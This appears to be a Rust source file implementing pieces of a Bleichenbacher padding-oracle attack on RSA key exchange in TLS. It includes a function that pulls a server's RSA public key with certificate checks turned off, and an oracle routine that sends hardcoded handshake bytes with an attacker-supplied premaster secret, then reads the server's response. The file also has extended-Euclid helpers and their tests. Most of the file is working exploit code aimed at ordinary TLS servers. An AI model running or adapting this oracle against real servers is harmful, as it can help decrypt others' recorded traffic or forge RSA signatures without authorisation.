use rug::Integer;
use openssl::ssl::{SslConnector, SslMethod, SslVerifyMode};
use std::error::Error;
use std::net::{TcpStream, Shutdown};
use std::io::{Write, Read};
use hex::FromHex;
use std::time::Duration;

pub fn u8_to_dec(digits: Vec<u8>) -> i128 {
    let mut tmp: String;
    let mut ret: i128;// = 0;
    let mut ret1: i128 = 0;
    let n = digits.len();
    for d in digits.iter().enumerate() {
        ret = 0;
        tmp = d.1.to_string();
        let len = tmp.len();
        for ch in tmp.chars().enumerate() {
            ret += ch.1.to_digit(10).unwrap() as i128 * 8_i128.pow((ch.0 + len - 1) as u32);
        }
        print!("{} ", ret);
        ret1 += ret * 10_i128.pow((d.0 + n - 1) as u32);
    }
    print!("\n");
    return ret1;
}

pub fn euclides(a: i128, b: i128) -> (i128, i128, i128) {
    let mut x1: i128 = 1;
    let mut y1: i128 = 0;
    let mut x2: i128 = 0;
    let mut y2: i128 = 1;
    let mut q: i128;
    let mut r1: i128 = a;
    let mut r2: i128 = b;
    while r2 != 0 {
        q = r1 / r2;
        (r1, r2) = (r2, r1 % r2);
        (x1, x2) = (x2, x1 - x2 * q);
        (y1, y2) = (y2, y1 - y2 * q);
    }
    return (r1, x1, y1);
}

pub fn euclides_gmp(a: Integer, b: Integer) -> (Integer, Integer, Integer) {
    let mut x1: Integer = Integer::from(1);
    let mut y1: Integer = Integer::from(0);
    let mut x2: Integer = Integer::from(0);
    let mut y2: Integer = Integer::from(1);
    let mut q: Integer;
    let mut tmp: Integer;
    let mut r1: Integer = a;
    let mut r2: Integer = b;
    while r2 != 0 {
        tmp = r2.clone();
        (q, r2) = r1.div_rem(r2);
        r1 = tmp;
        (x1, x2) = (x2.clone(), x1 - x2 * q.clone());
        (y1, y2) = (y2.clone(), y1 - y2 * q);
    }
    return (r1, x1, y1);
}

pub fn get_rsa_from_server(host: String, port: u16) -> (Integer, Integer){
    let mut connector_builder = SslConnector::builder(SslMethod::tls()).unwrap();
    connector_builder.set_verify(SslVerifyMode::NONE);
    let connector = connector_builder.build();

    let tmp: String = host.clone() + ":" + &port.to_string();
    let stream = TcpStream::connect(tmp).unwrap();
    let stream = connector.connect(&host, stream).unwrap();

    let key = stream.ssl().peer_certificate().unwrap().public_key().unwrap();
    let n = key.rsa().unwrap().n().to_owned();
    let e = key.rsa().unwrap().e().to_owned();

    let n_ret = n.unwrap().to_dec_str().unwrap().parse::<Integer>();
    let e_ret = e.unwrap().to_dec_str().unwrap().parse::<Integer>();
    return (n_ret.unwrap(), e_ret.unwrap());
}

pub fn bleichenbacher_oracle(host: String, port: u16, pms: &Vec<u8>) 
        -> Result<String, Box<dyn Error>> {

    let ch_tls = Vec::from_hex("16030100610100005d
    03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009
    d003d0035009c003c002f000a00ff01000024000d0020001e0601060206030501050205030401
    04020403030103020303020102020203".replace("\n","")
        .replace(" ","")).unwrap();
    let ch = ch_tls.as_slice();

    let ccs = Vec::from_hex("000101").unwrap();
    let enc = Vec::from_hex("005091a3b6aaa2b64d126e5583b04c113259c4efa4
    8e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f38
    8617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0".replace("\n","")
        .replace(" ","")).unwrap();

    let tmp: String = host.clone() + ":" + &port.to_string();
    let mut stream = TcpStream::connect(&tmp).unwrap();
    stream.set_nodelay(true).expect("set_nodelay failed");
    stream.set_write_timeout(Some(Duration::new(5,0)))
        .expect("failed to set nonblocking");
    stream.set_read_timeout(Some(Duration::new(5,0)))
        .expect("failed to set nonblocking");

    stream.write_all(&ch)?;

    // let cke_2nd_prefix = format!("{:x}",modulus_bytes + 6) + "1000" + 
    //    &format!("{:x}",modulus_bytes + 2) + &format!("{:x}",modulus_bytes);
    let cke_2nd_prefix = b"\x01\x06\x10\x00\x01\x02\x01\x00";

    let mut buff = vec![0; 4096];
    stream.read(&mut buff)?;

    let cke_version = Vec::from(&buff[9..11]);

    let mut tmp: Vec<u8> = Vec::from([b"\x16"[0]]);
    tmp = [tmp, cke_version.clone()].concat();
    stream.write(&tmp)?;

    stream.write(cke_2nd_prefix)?;

    stream.write(&pms)?;

    tmp = Vec::from_hex("14").unwrap();
    tmp = [tmp, cke_version.clone()].concat();
    tmp = [tmp, ccs].concat();
    stream.write(&tmp)?;

    tmp = Vec::from_hex("16").unwrap();
    tmp = [tmp, cke_version.clone()].concat();
    tmp = [tmp, enc].concat();
    stream.write(&tmp)?;

    let bend = stream.read_to_end(&mut buff)?;
    if bend == 0 {
        stream.shutdown(Shutdown::Both)?;
        return Ok(String::from("Ok"))
    }

    stream.shutdown(Shutdown::Both)?;
    Ok(String::new())
}

#[cfg(test)]
mod test {
    use crate::euclides;
    use crate::euclides_gmp;
    use crate::Integer;

    #[test]
    fn euclides_test() {
        let res = euclides(240, 46);
        assert_eq!(res.0, res.1 * 240 + res.2 * 46);
    }

    #[test]
    fn euclides_gmp_test() {
        let res = euclides_gmp(Integer::from(240),
        Integer::from(46));
        assert_eq!(res.0, res.1 * 240 + res.2 * 46);
    }
}